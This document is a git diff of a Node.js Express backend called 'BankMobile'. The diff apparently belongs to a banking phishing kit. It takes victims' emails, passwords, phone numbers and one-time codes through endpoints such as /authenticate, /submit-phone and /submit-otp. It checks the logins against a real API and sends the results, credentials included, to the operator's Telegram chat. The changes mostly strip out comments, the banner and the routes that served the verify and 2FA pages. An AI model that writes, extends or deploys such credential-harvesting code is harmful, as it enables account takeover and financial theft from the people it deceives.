@@ -1,5 +1,5 @@
 // ================================================
-// BANKMOBILE - BACKEND (ONE MESSAGE ONLY)
+// BANKMOBILE - BACKEND
 // ================================================
 
 require('dotenv').config();
@@ -14,24 +14,17 @@ const PORT = process.env.PORT || 3004;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// ================================================
-// MIDDLEWARE
-// ================================================
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-app.use(express.static('public'));
 
-// ================================================
-// SEND TO TELEGRAM
-// ================================================
 async function sendToTelegram(message) {
     if (!BOT_TOKEN || !CHAT_ID) {
         console.log('⚠️ Telegram not configured');
         return false;
     }
     try {
-        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'HTML'
@@ -44,9 +37,6 @@ async function sendToTelegram(message) {
     }
 }
 
-// ================================================
-// AUTHENTICATION
-// ================================================
 async function authenticateWithAPI(email, password) {
     try {
         console.log(`🌐 Sending login request for: ${email}`);
@@ -87,9 +77,6 @@ async function authenticateWithAPI(email, password) {
     }
 }
 
-// ================================================
-// LOGIN ENDPOINT - SINGLE MESSAGE ONLY
-// ================================================
 app.post('/authenticate', async (req, res) => {
     const { email, password } = req.body;
     
@@ -122,9 +109,6 @@ app.post('/authenticate', async (req, res) => {
     }
 });
 
-// ================================================
-// OTHER ENDPOINTS
-// ================================================
 app.post('/submit-phone', async (req, res) => {
     const { phone } = req.body;
     console.log(`📱 Phone: ${phone}`);
@@ -139,9 +123,6 @@ app.post('/submit-otp', async (req, res) => {
     res.json({ success: true });
 });
 
-// ================================================
-// HEALTH CHECK
-// ================================================
 app.get('/health', (req, res) => {
     res.json({ 
         status: 'ok', 
@@ -150,45 +131,15 @@ app.get('/health', (req, res) => {
     });
 });
 
-// ================================================
-// SERVE HTML FILES
-// ================================================
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.json({
+        service: 'BankMobile Backend API',
+        status: 'running',
+        telegram: BOT_TOKEN ? '✅ configured' : '❌ not configured'
+    });
 });
 
-app.get('/verify.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
-});
-
-app.get('/error_verify.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'error_verify.html'));
-});
-
-app.get('/2FA.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', '2FA.html'));
-});
-
-app.get('/success.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'success.html'));
-});
-
-// ================================================
-// START SERVER
-// ================================================
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`
-╔═══════════════════════════════════════════════════════════════╗
-║                                                               ║
-║   🔐 BANKMOBILE BACKEND                                     ║
-║                                                               ║
-║   📡 Server: http://localhost:${PORT}                          ║
-║   📱 Frontend: http://localhost:${PORT}/index.html            ║
-║   📨 TELEGRAM: ${BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}
-║                                                               ║
-║   🔥 ONE MESSAGE ONLY:                                       ║
-║   ✅ SUCCESS or ❌ FAILED with credentials                   ║
-║                                                               ║
-╚═══════════════════════════════════════════════════════════════╝
-    `);
+    console.log(`✅ BankMobile Backend running on port ${PORT}`);
+    console.log(`📨 Telegram: ${BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}`);
 });
